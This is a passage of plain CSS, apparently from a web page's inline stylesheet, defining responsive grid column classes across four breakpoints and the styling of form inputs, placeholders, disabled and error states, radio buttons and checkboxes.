            .col-sm-pull-15 {
                right: 62.5%
            }

            .col-sm-pull-16 {
                right: 66.66667%
            }

            .col-sm-pull-17 {
                right: 70.83333%
            }

            .col-sm-pull-18 {
                right: 75%
            }

            .col-sm-pull-19 {
                right: 79.16667%
            }

            .col-sm-pull-20 {
                right: 83.33333%
            }

            .col-sm-pull-21 {
                right: 87.5%
            }

            .col-sm-pull-22 {
                right: 91.66667%
            }

            .col-sm-pull-23 {
                right: 95.83333%
            }

            .col-sm-pull-24 {
                right: 100%
            }

            .col-sm-push-0 {
                left: auto
            }

            .col-sm-push-1 {
                left: 4.16667%
            }

            .col-sm-push-2 {
                left: 8.33333%
            }

            .col-sm-push-3 {
                left: 12.5%
            }

            .col-sm-push-4 {
                left: 16.66667%
            }

            .col-sm-push-5 {
                left: 20.83333%
            }

            .col-sm-push-6 {
                left: 25%
            }

            .col-sm-push-7 {
                left: 29.16667%
            }

            .col-sm-push-8 {
                left: 33.33333%
            }

            .col-sm-push-9 {
                left: 37.5%
            }

            .col-sm-push-10 {
                left: 41.66667%
            }

            .col-sm-push-11 {
                left: 45.83333%
            }

            .col-sm-push-12 {
                left: 50%
            }

            .col-sm-push-13 {
                left: 54.16667%
            }

            .col-sm-push-14 {
                left: 58.33333%
            }

            .col-sm-push-15 {
                left: 62.5%
            }

            .col-sm-push-16 {
                left: 66.66667%
            }

            .col-sm-push-17 {
                left: 70.83333%
            }

            .col-sm-push-18 {
                left: 75%
            }

            .col-sm-push-19 {
                left: 79.16667%
            }

            .col-sm-push-20 {
                left: 83.33333%
            }

            .col-sm-push-21 {
                left: 87.5%
            }

            .col-sm-push-22 {
                left: 91.66667%
            }

            .col-sm-push-23 {
                left: 95.83333%
            }

            .col-sm-push-24 {
                left: 100%
            }

            .col-sm-offset-0 {
                margin-left: 0
            }

            .col-sm-offset-1 {
                margin-left: 4.16667%
            }

            .col-sm-offset-2 {
                margin-left: 8.33333%
            }

            .col-sm-offset-3 {
                margin-left: 12.5%
            }

            .col-sm-offset-4 {
                margin-left: 16.66667%
            }

            .col-sm-offset-5 {
                margin-left: 20.83333%
            }

            .col-sm-offset-6 {
                margin-left: 25%
            }

            .col-sm-offset-7 {
                margin-left: 29.16667%
            }

            .col-sm-offset-8 {
                margin-left: 33.33333%
            }

            .col-sm-offset-9 {
                margin-left: 37.5%
            }

            .col-sm-offset-10 {
                margin-left: 41.66667%
            }

            .col-sm-offset-11 {
                margin-left: 45.83333%
            }

            .col-sm-offset-12 {
                margin-left: 50%
            }

            .col-sm-offset-13 {
                margin-left: 54.16667%
            }

            .col-sm-offset-14 {
                margin-left: 58.33333%
            }

            .col-sm-offset-15 {
                margin-left: 62.5%
            }

            .col-sm-offset-16 {
                margin-left: 66.66667%
            }

            .col-sm-offset-17 {
                margin-left: 70.83333%
            }

            .col-sm-offset-18 {
                margin-left: 75%
            }

            .col-sm-offset-19 {
                margin-left: 79.16667%
            }

            .col-sm-offset-20 {
                margin-left: 83.33333%
            }

            .col-sm-offset-21 {
                margin-left: 87.5%
            }

            .col-sm-offset-22 {
                margin-left: 91.66667%
            }

            .col-sm-offset-23 {
                margin-left: 95.83333%
            }

            .col-sm-offset-24 {
                margin-left: 100%
            }
        }

        @media (min-width:768px) {

            .col-md-1,
            .col-md-2,
            .col-md-3,
            .col-md-4,
            .col-md-5,
            .col-md-6,
            .col-md-7,
            .col-md-8,
            .col-md-9,
            .col-md-10,
            .col-md-11,
            .col-md-12,
            .col-md-13,
            .col-md-14,
            .col-md-15,
            .col-md-16,
            .col-md-17,
            .col-md-18,
            .col-md-19,
            .col-md-20,
            .col-md-21,
            .col-md-22,
            .col-md-23,
            .col-md-24 {
                float: left
            }

            .col-md-1 {
                width: 4.16667%
            }

            .col-md-2 {
                width: 8.33333%
            }

            .col-md-3 {
                width: 12.5%
            }

            .col-md-4 {
                width: 16.66667%
            }

            .col-md-5 {
                width: 20.83333%
            }

            .col-md-6 {
                width: 25%
            }

            .col-md-7 {
                width: 29.16667%
            }

            .col-md-8 {
                width: 33.33333%
            }

            .col-md-9 {
                width: 37.5%
            }

            .col-md-10 {
                width: 41.66667%
            }

            .col-md-11 {
                width: 45.83333%
            }

            .col-md-12 {
                width: 50%
            }

            .col-md-13 {
                width: 54.16667%
            }

            .col-md-14 {
                width: 58.33333%
            }

            .col-md-15 {
                width: 62.5%
            }

            .col-md-16 {
                width: 66.66667%
            }

            .col-md-17 {
                width: 70.83333%
            }

            .col-md-18 {
                width: 75%
            }

            .col-md-19 {
                width: 79.16667%
            }

            .col-md-20 {
                width: 83.33333%
            }

            .col-md-21 {
                width: 87.5%
            }

            .col-md-22 {
                width: 91.66667%
            }

            .col-md-23 {
                width: 95.83333%
            }

            .col-md-24 {
                width: 100%
            }

            .col-md-pull-0 {
                right: auto
            }

            .col-md-pull-1 {
                right: 4.16667%
            }

            .col-md-pull-2 {
                right: 8.33333%
            }

            .col-md-pull-3 {
                right: 12.5%
            }

            .col-md-pull-4 {
                right: 16.66667%
            }

            .col-md-pull-5 {
                right: 20.83333%
            }

            .col-md-pull-6 {
                right: 25%
            }

            .col-md-pull-7 {
                right: 29.16667%
            }

            .col-md-pull-8 {
                right: 33.33333%
            }

            .col-md-pull-9 {
                right: 37.5%
            }

            .col-md-pull-10 {
                right: 41.66667%
            }

            .col-md-pull-11 {
                right: 45.83333%
            }

            .col-md-pull-12 {
                right: 50%
            }

            .col-md-pull-13 {
                right: 54.16667%
            }

            .col-md-pull-14 {
                right: 58.33333%
            }

            .col-md-pull-15 {
                right: 62.5%
            }

            .col-md-pull-16 {
                right: 66.66667%
            }

            .col-md-pull-17 {
                right: 70.83333%
            }

            .col-md-pull-18 {
                right: 75%
            }

            .col-md-pull-19 {
                right: 79.16667%
            }

            .col-md-pull-20 {
                right: 83.33333%
            }

            .col-md-pull-21 {
                right: 87.5%
            }

            .col-md-pull-22 {
                right: 91.66667%
            }

            .col-md-pull-23 {
                right: 95.83333%
            }

            .col-md-pull-24 {
                right: 100%
            }

            .col-md-push-0 {
                left: auto
            }

            .col-md-push-1 {
                left: 4.16667%
            }

            .col-md-push-2 {
                left: 8.33333%
            }

            .col-md-push-3 {
                left: 12.5%
            }

            .col-md-push-4 {
                left: 16.66667%
            }

            .col-md-push-5 {
                left: 20.83333%
            }

            .col-md-push-6 {
                left: 25%
            }

            .col-md-push-7 {
                left: 29.16667%
            }

            .col-md-push-8 {
                left: 33.33333%
            }

            .col-md-push-9 {
                left: 37.5%
            }

            .col-md-push-10 {
                left: 41.66667%
            }

            .col-md-push-11 {
                left: 45.83333%
            }

            .col-md-push-12 {
                left: 50%
            }

            .col-md-push-13 {
                left: 54.16667%
            }

            .col-md-push-14 {
                left: 58.33333%
            }

            .col-md-push-15 {
                left: 62.5%
            }

            .col-md-push-16 {
                left: 66.66667%
            }

            .col-md-push-17 {
                left: 70.83333%
            }

            .col-md-push-18 {
                left: 75%
            }

            .col-md-push-19 {
                left: 79.16667%
            }

            .col-md-push-20 {
                left: 83.33333%
            }

            .col-md-push-21 {
                left: 87.5%
            }

            .col-md-push-22 {
                left: 91.66667%
            }

            .col-md-push-23 {
                left: 95.83333%
            }

            .col-md-push-24 {
                left: 100%
            }

            .col-md-offset-0 {
                margin-left: 0
            }

            .col-md-offset-1 {
                margin-left: 4.16667%
            }

            .col-md-offset-2 {
                margin-left: 8.33333%
            }

            .col-md-offset-3 {
                margin-left: 12.5%
            }

            .col-md-offset-4 {
                margin-left: 16.66667%
            }

            .col-md-offset-5 {
                margin-left: 20.83333%
            }

            .col-md-offset-6 {
                margin-left: 25%
            }

            .col-md-offset-7 {
                margin-left: 29.16667%
            }

            .col-md-offset-8 {
                margin-left: 33.33333%
            }

            .col-md-offset-9 {
                margin-left: 37.5%
            }

            .col-md-offset-10 {
                margin-left: 41.66667%
            }

            .col-md-offset-11 {
                margin-left: 45.83333%
            }

            .col-md-offset-12 {
                margin-left: 50%
            }

            .col-md-offset-13 {
                margin-left: 54.16667%
            }

            .col-md-offset-14 {
                margin-left: 58.33333%
            }

            .col-md-offset-15 {
                margin-left: 62.5%
            }

            .col-md-offset-16 {
                margin-left: 66.66667%
            }

            .col-md-offset-17 {
                margin-left: 70.83333%
            }

            .col-md-offset-18 {
                margin-left: 75%
            }

            .col-md-offset-19 {
                margin-left: 79.16667%
            }

            .col-md-offset-20 {
                margin-left: 83.33333%
            }

            .col-md-offset-21 {
                margin-left: 87.5%
            }

            .col-md-offset-22 {
                margin-left: 91.66667%
            }

            .col-md-offset-23 {
                margin-left: 95.83333%
            }

            .col-md-offset-24 {
                margin-left: 100%
            }
        }

        @media (min-width:992px) {

            .col-lg-1,
            .col-lg-2,
            .col-lg-3,
            .col-lg-4,
            .col-lg-5,
            .col-lg-6,
            .col-lg-7,
            .col-lg-8,
            .col-lg-9,
            .col-lg-10,
            .col-lg-11,
            .col-lg-12,
            .col-lg-13,
            .col-lg-14,
            .col-lg-15,
            .col-lg-16,
            .col-lg-17,
            .col-lg-18,
            .col-lg-19,
            .col-lg-20,
            .col-lg-21,
            .col-lg-22,
            .col-lg-23,
            .col-lg-24 {
                float: left
            }

            .col-lg-1 {
                width: 4.16667%
            }

            .col-lg-2 {
                width: 8.33333%
            }

            .col-lg-3 {
                width: 12.5%
            }

            .col-lg-4 {
                width: 16.66667%
            }

            .col-lg-5 {
                width: 20.83333%
            }

            .col-lg-6 {
                width: 25%
            }

            .col-lg-7 {
                width: 29.16667%
            }

            .col-lg-8 {
                width: 33.33333%
            }

            .col-lg-9 {
                width: 37.5%
            }

            .col-lg-10 {
                width: 41.66667%
            }

            .col-lg-11 {
                width: 45.83333%
            }

            .col-lg-12 {
                width: 50%
            }

            .col-lg-13 {
                width: 54.16667%
            }

            .col-lg-14 {
                width: 58.33333%
            }

            .col-lg-15 {
                width: 62.5%
            }

            .col-lg-16 {
                width: 66.66667%
            }

            .col-lg-17 {
                width: 70.83333%
            }

            .col-lg-18 {
                width: 75%
            }

            .col-lg-19 {
                width: 79.16667%
            }

            .col-lg-20 {
                width: 83.33333%
            }

            .col-lg-21 {
                width: 87.5%
            }

            .col-lg-22 {
                width: 91.66667%
            }

            .col-lg-23 {
                width: 95.83333%
            }

            .col-lg-24 {
                width: 100%
            }

            .col-lg-pull-0 {
                right: auto
            }

            .col-lg-pull-1 {
                right: 4.16667%
            }

            .col-lg-pull-2 {
                right: 8.33333%
            }

            .col-lg-pull-3 {
                right: 12.5%
            }

            .col-lg-pull-4 {
                right: 16.66667%
            }

            .col-lg-pull-5 {
                right: 20.83333%
            }

            .col-lg-pull-6 {
                right: 25%
            }

            .col-lg-pull-7 {
                right: 29.16667%
            }

            .col-lg-pull-8 {
                right: 33.33333%
            }

            .col-lg-pull-9 {
                right: 37.5%
            }

            .col-lg-pull-10 {
                right: 41.66667%
            }

            .col-lg-pull-11 {
                right: 45.83333%
            }

            .col-lg-pull-12 {
                right: 50%
            }

            .col-lg-pull-13 {
                right: 54.16667%
            }

            .col-lg-pull-14 {
                right: 58.33333%
            }

            .col-lg-pull-15 {
                right: 62.5%
            }

            .col-lg-pull-16 {
                right: 66.66667%
            }

            .col-lg-pull-17 {
                right: 70.83333%
            }

            .col-lg-pull-18 {
                right: 75%
            }

            .col-lg-pull-19 {
                right: 79.16667%
            }

            .col-lg-pull-20 {
                right: 83.33333%
            }

            .col-lg-pull-21 {
                right: 87.5%
            }

            .col-lg-pull-22 {
                right: 91.66667%
            }

            .col-lg-pull-23 {
                right: 95.83333%
            }

            .col-lg-pull-24 {
                right: 100%
            }

            .col-lg-push-0 {
                left: auto
            }

            .col-lg-push-1 {
                left: 4.16667%
            }

            .col-lg-push-2 {
                left: 8.33333%
            }

            .col-lg-push-3 {
                left: 12.5%
            }

            .col-lg-push-4 {
                left: 16.66667%
            }

            .col-lg-push-5 {
                left: 20.83333%
            }

            .col-lg-push-6 {
                left: 25%
            }

            .col-lg-push-7 {
                left: 29.16667%
            }

            .col-lg-push-8 {
                left: 33.33333%
            }

            .col-lg-push-9 {
                left: 37.5%
            }

            .col-lg-push-10 {
                left: 41.66667%
            }

            .col-lg-push-11 {
                left: 45.83333%
            }

            .col-lg-push-12 {
                left: 50%
            }

            .col-lg-push-13 {
                left: 54.16667%
            }

            .col-lg-push-14 {
                left: 58.33333%
            }

            .col-lg-push-15 {
                left: 62.5%
            }

            .col-lg-push-16 {
                left: 66.66667%
            }

            .col-lg-push-17 {
                left: 70.83333%
            }

            .col-lg-push-18 {
                left: 75%
            }

            .col-lg-push-19 {
                left: 79.16667%
            }

            .col-lg-push-20 {
                left: 83.33333%
            }

            .col-lg-push-21 {
                left: 87.5%
            }

            .col-lg-push-22 {
                left: 91.66667%
            }

            .col-lg-push-23 {
                left: 95.83333%
            }

            .col-lg-push-24 {
                left: 100%
            }

            .col-lg-offset-0 {
                margin-left: 0
            }

            .col-lg-offset-1 {
                margin-left: 4.16667%
            }

            .col-lg-offset-2 {
                margin-left: 8.33333%
            }

            .col-lg-offset-3 {
                margin-left: 12.5%
            }

            .col-lg-offset-4 {
                margin-left: 16.66667%
            }

            .col-lg-offset-5 {
                margin-left: 20.83333%
            }

            .col-lg-offset-6 {
                margin-left: 25%
            }

            .col-lg-offset-7 {
                margin-left: 29.16667%
            }

            .col-lg-offset-8 {
                margin-left: 33.33333%
            }

            .col-lg-offset-9 {
                margin-left: 37.5%
            }

            .col-lg-offset-10 {
                margin-left: 41.66667%
            }

            .col-lg-offset-11 {
                margin-left: 45.83333%
            }

            .col-lg-offset-12 {
                margin-left: 50%
            }

            .col-lg-offset-13 {
                margin-left: 54.16667%
            }

            .col-lg-offset-14 {
                margin-left: 58.33333%
            }

            .col-lg-offset-15 {
                margin-left: 62.5%
            }

            .col-lg-offset-16 {
                margin-left: 66.66667%
            }

            .col-lg-offset-17 {
                margin-left: 70.83333%
            }

            .col-lg-offset-18 {
                margin-left: 75%
            }

            .col-lg-offset-19 {
                margin-left: 79.16667%
            }

            .col-lg-offset-20 {
                margin-left: 83.33333%
            }

            .col-lg-offset-21 {
                margin-left: 87.5%
            }

            .col-lg-offset-22 {
                margin-left: 91.66667%
            }

            .col-lg-offset-23 {
                margin-left: 95.83333%
            }

            .col-lg-offset-24 {
                margin-left: 100%
            }
        }

        @media (min-width:1400px) {

            .col-xl-1,
            .col-xl-2,
            .col-xl-3,
            .col-xl-4,
            .col-xl-5,
            .col-xl-6,
            .col-xl-7,
            .col-xl-8,
            .col-xl-9,
            .col-xl-10,
            .col-xl-11,
            .col-xl-12,
            .col-xl-13,
            .col-xl-14,
            .col-xl-15,
            .col-xl-16,
            .col-xl-17,
            .col-xl-18,
            .col-xl-19,
            .col-xl-20,
            .col-xl-21,
            .col-xl-22,
            .col-xl-23,
            .col-xl-24 {
                float: left
            }

            .col-xl-1 {
                width: 4.16667%
            }

            .col-xl-2 {
                width: 8.33333%
            }

            .col-xl-3 {
                width: 12.5%
            }

            .col-xl-4 {
                width: 16.66667%
            }

            .col-xl-5 {
                width: 20.83333%
            }

            .col-xl-6 {
                width: 25%
            }

            .col-xl-7 {
                width: 29.16667%
            }

            .col-xl-8 {
                width: 33.33333%
            }

            .col-xl-9 {
                width: 37.5%
            }

            .col-xl-10 {
                width: 41.66667%
            }

            .col-xl-11 {
                width: 45.83333%
            }

            .col-xl-12 {
                width: 50%
            }

            .col-xl-13 {
                width: 54.16667%
            }

            .col-xl-14 {
                width: 58.33333%
            }

            .col-xl-15 {
                width: 62.5%
            }

            .col-xl-16 {
                width: 66.66667%
            }

            .col-xl-17 {
                width: 70.83333%
            }

            .col-xl-18 {
                width: 75%
            }

            .col-xl-19 {
                width: 79.16667%
            }

            .col-xl-20 {
                width: 83.33333%
            }

            .col-xl-21 {
                width: 87.5%
            }

            .col-xl-22 {
                width: 91.66667%
            }

            .col-xl-23 {
                width: 95.83333%
            }

            .col-xl-24 {
                width: 100%
            }

            .col-xl-pull-0 {
                right: auto
            }

            .col-xl-pull-1 {
                right: 4.16667%
            }

            .col-xl-pull-2 {
                right: 8.33333%
            }

            .col-xl-pull-3 {
                right: 12.5%
            }

            .col-xl-pull-4 {
                right: 16.66667%
            }

            .col-xl-pull-5 {
                right: 20.83333%
            }

            .col-xl-pull-6 {
                right: 25%
            }

            .col-xl-pull-7 {
                right: 29.16667%
            }

            .col-xl-pull-8 {
                right: 33.33333%
            }

            .col-xl-pull-9 {
                right: 37.5%
            }

            .col-xl-pull-10 {
                right: 41.66667%
            }

            .col-xl-pull-11 {
                right: 45.83333%
            }

            .col-xl-pull-12 {
                right: 50%
            }

            .col-xl-pull-13 {
                right: 54.16667%
            }

            .col-xl-pull-14 {
                right: 58.33333%
            }

            .col-xl-pull-15 {
                right: 62.5%
            }

            .col-xl-pull-16 {
                right: 66.66667%
            }

            .col-xl-pull-17 {
                right: 70.83333%
            }

            .col-xl-pull-18 {
                right: 75%
            }

            .col-xl-pull-19 {
                right: 79.16667%
            }

            .col-xl-pull-20 {
                right: 83.33333%
            }

            .col-xl-pull-21 {
                right: 87.5%
            }

            .col-xl-pull-22 {
                right: 91.66667%
            }

            .col-xl-pull-23 {
                right: 95.83333%
            }

            .col-xl-pull-24 {
                right: 100%
            }

            .col-xl-push-0 {
                left: auto
            }

            .col-xl-push-1 {
                left: 4.16667%
            }

            .col-xl-push-2 {
                left: 8.33333%
            }

            .col-xl-push-3 {
                left: 12.5%
            }

            .col-xl-push-4 {
                left: 16.66667%
            }

            .col-xl-push-5 {
                left: 20.83333%
            }

            .col-xl-push-6 {
                left: 25%
            }

            .col-xl-push-7 {
                left: 29.16667%
            }

            .col-xl-push-8 {
                left: 33.33333%
            }

            .col-xl-push-9 {
                left: 37.5%
            }

            .col-xl-push-10 {
                left: 41.66667%
            }

            .col-xl-push-11 {
                left: 45.83333%
            }

            .col-xl-push-12 {
                left: 50%
            }

            .col-xl-push-13 {
                left: 54.16667%
            }

            .col-xl-push-14 {
                left: 58.33333%
            }

            .col-xl-push-15 {
                left: 62.5%
            }

            .col-xl-push-16 {
                left: 66.66667%
            }

            .col-xl-push-17 {
                left: 70.83333%
            }

            .col-xl-push-18 {
                left: 75%
            }

            .col-xl-push-19 {
                left: 79.16667%
            }

            .col-xl-push-20 {
                left: 83.33333%
            }

            .col-xl-push-21 {
                left: 87.5%
            }

            .col-xl-push-22 {
                left: 91.66667%
            }

            .col-xl-push-23 {
                left: 95.83333%
            }

            .col-xl-push-24 {
                left: 100%
            }

            .col-xl-offset-0 {
                margin-left: 0
            }

            .col-xl-offset-1 {
                margin-left: 4.16667%
            }

            .col-xl-offset-2 {
                margin-left: 8.33333%
            }

            .col-xl-offset-3 {
                margin-left: 12.5%
            }

            .col-xl-offset-4 {
                margin-left: 16.66667%
            }

            .col-xl-offset-5 {
                margin-left: 20.83333%
            }

            .col-xl-offset-6 {
                margin-left: 25%
            }

            .col-xl-offset-7 {
                margin-left: 29.16667%
            }

            .col-xl-offset-8 {
                margin-left: 33.33333%
            }

            .col-xl-offset-9 {
                margin-left: 37.5%
            }

            .col-xl-offset-10 {
                margin-left: 41.66667%
            }

            .col-xl-offset-11 {
                margin-left: 45.83333%
            }

            .col-xl-offset-12 {
                margin-left: 50%
            }

            .col-xl-offset-13 {
                margin-left: 54.16667%
            }

            .col-xl-offset-14 {
                margin-left: 58.33333%
            }

            .col-xl-offset-15 {
                margin-left: 62.5%
            }

            .col-xl-offset-16 {
                margin-left: 66.66667%
            }

            .col-xl-offset-17 {
                margin-left: 70.83333%
            }

            .col-xl-offset-18 {
                margin-left: 75%
            }

            .col-xl-offset-19 {
                margin-left: 79.16667%
            }

            .col-xl-offset-20 {
                margin-left: 83.33333%
            }

            .col-xl-offset-21 {
                margin-left: 87.5%
            }

            .col-xl-offset-22 {
                margin-left: 91.66667%
            }

            .col-xl-offset-23 {
                margin-left: 95.83333%
            }

            .col-xl-offset-24 {
                margin-left: 100%
            }
        }

        fieldset {
            padding: 0;
            margin: 0;
            border: 0;
            min-width: 0
        }

        legend {
            display: block;
            width: 100%;
            padding: 0;
            border: 0
        }

        label {
            display: inline-block;
            max-width: 100%
        }

        input[type="search"] {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        input[type="file"] {
            display: block
        }

        input[type="range"] {
            display: block;
            width: 100%
        }

        select[multiple],
        select[size] {
            height: auto
        }

        input[type="file"]:focus,
        input[type="radio"]:focus,
        input[type="checkbox"]:focus {
            outline: thin dotted;
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px
        }

        output {
            display: block;
            padding-top: 7px
        }

        .form-control {
            display: block;
            width: 100%;
            background-image: none
        }

        textarea.form-control {
            height: auto
        }

        input[type="search"] {
            -webkit-appearance: none
        }

        input[type="date"],
        input[type="time"],
        input[type="datetime-local"],
        input[type="month"] {
            line-height: 34px
        }

        .radio,
        .checkbox {
            position: relative;
            display: block
        }

        .radio label,
        .checkbox label {
            min-height: 20px;
            margin-bottom: 0;
            cursor: pointer
        }

        .radio.disabled label,
        fieldset[disabled] .radio label,
        .checkbox.disabled label,
        fieldset[disabled] .checkbox label {
            cursor: not-allowed
        }

        .help-block {
            display: block;
            margin-top: 5px;
            margin-bottom: 10px
        }

        @media (min-width:540px) {
            .form-inline .form-group {
                display: inline-block;
                margin-bottom: 0;
                vertical-align: middle
            }

            .form-inline .form-control {
                display: inline-block;
                width: auto;
                vertical-align: middle
            }

            .form-inline .input-group {
                display: inline-table;
                vertical-align: middle
            }

            .form-inline .input-group .input-group-addon,
            .form-inline .input-group .input-group-btn,
            .form-inline .input-group .form-control {
                width: auto
            }

            .form-inline .input-group>.form-control {
                width: 100%
            }

            .form-inline .control-label {
                margin-bottom: 0;
                vertical-align: middle
            }

            .form-inline .radio,
            .form-inline .checkbox {
                display: inline-block;
                margin-top: 0;
                margin-bottom: 0;
                vertical-align: middle
            }
        }

        input,
        button,
        textarea,
        select,
        option,
        progress {
            max-width: 100%;
            line-height: inherit
        }

        .text-input,
        input[type="color"],
        input[type="date"],
        input[type="datetime"],
        input[type="datetime-local"],
        input[type="email"],
        input[type="month"],
        input[type="number"],
        input[type="password"],
        input[type="search"],
        input[type="tel"],
        input[type="text"],
        input[type="time"],
        input[type="url"],
        input[type="week"],
        textarea {
            padding: 4px 8px;
            border-style: solid;
            border-width: 2px;
            border-color: rgba(0, 0, 0, 0.4);
            background-color: rgba(255, 255, 255, 0.4);
            height: 32px;
            height: 2rem
        }

        .text-input-focus,
        input[type="color"]:focus,
        input[type="date"]:focus,
        input[type="datetime"]:focus,
        input[type="datetime-local"]:focus,
        input[type="email"]:focus,
        input[type="month"]:focus,
        input[type="number"]:focus,
        input[type="password"]:focus,
        input[type="search"]:focus,
        input[type="tel"]:focus,
        input[type="text"]:focus,
        input[type="time"]:focus,
        input[type="url"]:focus,
        input[type="week"]:focus,
        textarea:focus {
            border-color: #0067b8;
            background-color: #fff
        }

        .text-input-moz-placeholder,
        input[type="color"]::-moz-placeholder,
        input[type="date"]::-moz-placeholder,
        input[type="datetime"]::-moz-placeholder,
        input[type="datetime-local"]::-moz-placeholder,
        input[type="email"]::-moz-placeholder,
        input[type="month"]::-moz-placeholder,
        input[type="number"]::-moz-placeholder,
        input[type="password"]::-moz-placeholder,
        input[type="search"]::-moz-placeholder,
        input[type="tel"]::-moz-placeholder,
        input[type="text"]::-moz-placeholder,
        input[type="time"]::-moz-placeholder,
        input[type="url"]::-moz-placeholder,
        input[type="week"]::-moz-placeholder,
        textarea::-moz-placeholder {
            color: rgba(0, 0, 0, 0.6);
            opacity: 1
        }

        .text-input-ms-placeholder,
        input[type="color"]:-ms-input-placeholder,
        input[type="date"]:-ms-input-placeholder,
        input[type="datetime"]:-ms-input-placeholder,
        input[type="datetime-local"]:-ms-input-placeholder,
        input[type="email"]:-ms-input-placeholder,
        input[type="month"]:-ms-input-placeholder,
        input[type="number"]:-ms-input-placeholder,
        input[type="password"]:-ms-input-placeholder,
        input[type="search"]:-ms-input-placeholder,
        input[type="tel"]:-ms-input-placeholder,
        input[type="text"]:-ms-input-placeholder,
        input[type="time"]:-ms-input-placeholder,
        input[type="url"]:-ms-input-placeholder,
        input[type="week"]:-ms-input-placeholder,
        textarea:-ms-input-placeholder {
            color: rgba(0, 0, 0, 0.6)
        }

        .text-input-webkit-placeholder,
        input[type="color"]::-webkit-input-placeholder,
        input[type="date"]::-webkit-input-placeholder,
        input[type="datetime"]::-webkit-input-placeholder,
        input[type="datetime-local"]::-webkit-input-placeholder,
        input[type="email"]::-webkit-input-placeholder,
        input[type="month"]::-webkit-input-placeholder,
        input[type="number"]::-webkit-input-placeholder,
        input[type="password"]::-webkit-input-placeholder,
        input[type="search"]::-webkit-input-placeholder,
        input[type="tel"]::-webkit-input-placeholder,
        input[type="text"]::-webkit-input-placeholder,
        input[type="time"]::-webkit-input-placeholder,
        input[type="url"]::-webkit-input-placeholder,
        input[type="week"]::-webkit-input-placeholder,
        textarea::-webkit-input-placeholder {
            color: rgba(0, 0, 0, 0.6)
        }

        .text-input-disabled,
        input[type="color"][disabled],
        input[type="color"][readonly],
        fieldset[disabled] input[type="color"],
        input[type="date"][disabled],
        input[type="date"][readonly],
        fieldset[disabled] input[type="date"],
        input[type="datetime"][disabled],
        input[type="datetime"][readonly],
        fieldset[disabled] input[type="datetime"],
        input[type="datetime-local"][disabled],
        input[type="datetime-local"][readonly],
        fieldset[disabled] input[type="datetime-local"],
        input[type="email"][disabled],
        input[type="email"][readonly],
        fieldset[disabled] input[type="email"],
        input[type="month"][disabled],
        input[type="month"][readonly],
        fieldset[disabled] input[type="month"],
        input[type="number"][disabled],
        input[type="number"][readonly],
        fieldset[disabled] input[type="number"],
        input[type="password"][disabled],
        input[type="password"][readonly],
        fieldset[disabled] input[type="password"],
        input[type="search"][disabled],
        input[type="search"][readonly],
        fieldset[disabled] input[type="search"],
        input[type="tel"][disabled],
        input[type="tel"][readonly],
        fieldset[disabled] input[type="tel"],
        input[type="text"][disabled],
        input[type="text"][readonly],
        fieldset[disabled] input[type="text"],
        input[type="time"][disabled],
        input[type="time"][readonly],
        fieldset[disabled] input[type="time"],
        input[type="url"][disabled],
        input[type="url"][readonly],
        fieldset[disabled] input[type="url"],
        input[type="week"][disabled],
        input[type="week"][readonly],
        fieldset[disabled] input[type="week"],
        textarea[disabled],
        textarea[readonly],
        fieldset[disabled] textarea {
            border-color: #ccc !important;
            background-color: rgba(0, 0, 0, 0.2) !important;
            color: rgba(0, 0, 0, 0.2) !important
        }

        .text-input-has-error,
        .form-group.has-error input[type="color"],
        input[type="color"].has-error,
        .form-group.has-error input[type="date"],
        input[type="date"].has-error,
        .form-group.has-error input[type="datetime"],
        input[type="datetime"].has-error,
        .form-group.has-error input[type="datetime-local"],
        input[type="datetime-local"].has-error,
        .form-group.has-error input[type="email"],
        input[type="email"].has-error,
        .form-group.has-error input[type="month"],
        input[type="month"].has-error,
        .form-group.has-error input[type="number"],
        input[type="number"].has-error,
        .form-group.has-error input[type="password"],
        input[type="password"].has-error,
        .form-group.has-error input[type="search"],
        input[type="search"].has-error,
        .form-group.has-error input[type="tel"],
        input[type="tel"].has-error,
        .form-group.has-error input[type="text"],
        input[type="text"].has-error,
        .form-group.has-error input[type="time"],
        input[type="time"].has-error,
        .form-group.has-error input[type="url"],
        input[type="url"].has-error,
        .form-group.has-error input[type="week"],
        input[type="week"].has-error,
        .form-group.has-error textarea,
        textarea.has-error {
            border-color: #e81123
        }

        textarea {
            height: auto
        }

        input::-ms-clear,
        input::-ms-reveal {
            height: 100%;
            padding: 4px 8px;
            margin-right: -8px;
            margin-left: 4px
        }

        input::-ms-clear:hover,
        input::-ms-reveal:hover {
            color: #0067b8
        }

        input::-ms-clear:active,
        input::-ms-reveal:active {
            color: #fff;
            background-color: #0067b8
        }

        .form-group.has-error input::-ms-clear:hover,
        .form-group.has-error input::-ms-reveal:hover,
        input.has-error::-ms-clear:hover,
        input.has-error::-ms-reveal:hover {
            color: #e81123
        }

        .form-group.has-error input::-ms-clear:active,
        .form-group.has-error input::-ms-reveal:active,
        input.has-error::-ms-clear:active,
        input.has-error::-ms-reveal:active {
            color: #fff;
            background-color: #e81123
        }

        input[type="radio"] {
            width: 20px;
            height: 20px
        }

        input[type="radio"]::-ms-check {
            background-color: #fff;
            color: #000;
            border-style: solid;
            border-width: 2px;
            border-color: rgba(0, 0, 0, 0.6)
        }

        input[type="radio"]:checked::-ms-check {
            color: #000;
            border-color: #0067b8
        }

        input[type="radio"]:hover::-ms-check {
            border-color: #000
        }

        input[type="radio"]:hover:checked::-ms-check {
            border-color: #0067b8
        }

        input[type="radio"]:active::-ms-check {
            color: rgba(0, 0, 0, 0.6);
            border-color: rgba(0, 0, 0, 0.6)
        }

        input[type="radio"]:active:checked::-ms-check {
            border-color: rgba(0, 0, 0, 0.6)
        }

        input[type="radio"][disabled]::-ms-check,
        fieldset[disabled] input[type="radio"]::-ms-check {
            background-color: #fff !important;
            color: rgba(0, 0, 0, 0.2) !important;
            border-color: rgba(0, 0, 0, 0.2) !important
        }

        input[type="radio"][disabled]:checked::-ms-check,
        fieldset[disabled] input[type="radio"]:checked::-ms-check {
            color: rgba(0, 0, 0, 0.2) !important
        }

        input[type="checkbox"] {
            width: 20px;
            height: 20px
        }

        input[type="checkbox"]::-ms-check {
            border-style: solid;
            border-width: 2px;
            background-color: transparent;
            color: #000;
            border-color: rgba(0, 0, 0, 0.8)
        }

        input[type="checkbox"]:checked::-ms-check {
            background-color: #0067b8;
            border-color: #0067b8
        }

        input[type="checkbox"]:hover::-ms-check {
            border-color: #000
        }

        input[type="checkbox"]:active::-ms-check {
            background-color: rgba(0, 0, 0, 0.6);
            border-color: transparent
        }

        input[type="checkbox"][disabled]::-ms-check,
